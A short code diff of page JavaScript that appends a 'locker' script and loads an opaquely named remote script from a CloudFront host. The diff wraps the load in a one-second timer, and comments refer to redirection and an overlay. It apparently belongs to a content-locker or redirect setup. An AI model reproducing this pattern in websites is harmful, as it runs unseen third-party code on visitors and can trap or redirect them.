@@ -57,7 +57,7 @@ document.body.appendChild(lockerScript);
 
 const scriptTag = document.createElement('script');
 scriptTag.src = 'https://d2yc6hxtq0phup.cloudfront.net/ea659ba.js';
-document.body.appendChild(scriptTag);                        
+document.body.appendChild(scriptTag);    }, 1000);                    
                         // The following code won't execute due to redirection
                         // But keeping it in case redirection is disabled
                         overlay.style.display = 'none';
